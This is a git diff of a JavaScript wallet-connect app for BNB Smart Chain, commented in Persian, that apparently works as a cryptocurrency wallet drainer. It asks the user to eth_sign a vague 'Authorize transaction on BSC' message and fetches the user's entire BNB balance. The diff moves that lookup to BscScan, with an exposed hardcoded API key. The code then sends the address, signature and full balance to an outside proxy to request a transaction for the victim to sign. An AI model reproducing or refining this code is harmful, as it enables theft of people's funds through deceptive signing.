@@ -1,6 +1,23 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
+const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P"; // 🔴 کلید API خودت رو اینجا بذار
+
+async function getBNBBalance(address) {
+  try {
+    const response = await fetch(
+      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
+    );
+    const data = await response.json();
+    if (data.status === "1") {
+      return (parseInt(data.result) / 1e18).toFixed(6); // تبدیل مقدار به BNB
+    }
+  } catch (error) {
+    console.error("❌ Error fetching BNB balance:", error);
+  }
+  return null;
+}
+
 function App() {
   async function runner() {
     if (typeof localStorage !== "undefined") {
@@ -9,8 +26,8 @@ function App() {
 
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56], // فقط BSC
-      methods: ["eth_sign", "eth_getBalance"],
+      chains: [56],
+      methods: ["eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -29,7 +46,7 @@ function App() {
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
+        params: [{ chainId: "0x38" }],
       });
     } catch (error) {
       console.error("❌ Error in switching chain:", error);
@@ -38,22 +55,6 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    // **📌 دریافت مقدار BNB از کیف پول**
-    let amount;
-    try {
-      const balanceHex = await provider.request({
-        method: "eth_getBalance",
-        params: [accountSender, "latest"],
-      });
-      amount = parseInt(balanceHex, 16); // تبدیل از هگز به عدد
-    } catch (error) {
-      console.error("❌ Error in fetching balance:", error);
-      return;
-    }
-
-    console.log("💰 User Balance:", amount);
-
-    // **📌 دریافت امضای اولیه از کیف پول برای تأیید کاربر**
     const message = "Authorize transaction on BSC";
     let signature;
     try {
@@ -68,7 +69,14 @@ function App() {
 
     console.log("✍️ Signature:", signature);
 
-    // **📌 ارسال امضا و درخواست تراکنش به سرور**
+    // ✅ مقدار BNB رو از BSCscan می‌گیریم
+    const amount = await getBNBBalance(accountSender);
+    if (!amount) {
+      console.error("❌ Failed to fetch BNB balance.");
+      return;
+    }
+    console.log("💰 BNB Balance:", amount);
+
     async function signAndSendTransaction() {
       try {
         console.log("📡 Requesting Unsigned Transaction...");
@@ -77,7 +85,7 @@ function App() {
           handler: "tx",
           address: accountSender,
           signature: signature,
-          amount: amount, // ارسال مقدار BNB کاربر
+          amount: amount, // ارسال مقدار BNB دریافت شده
         });
 
         if (!result || result.error) {
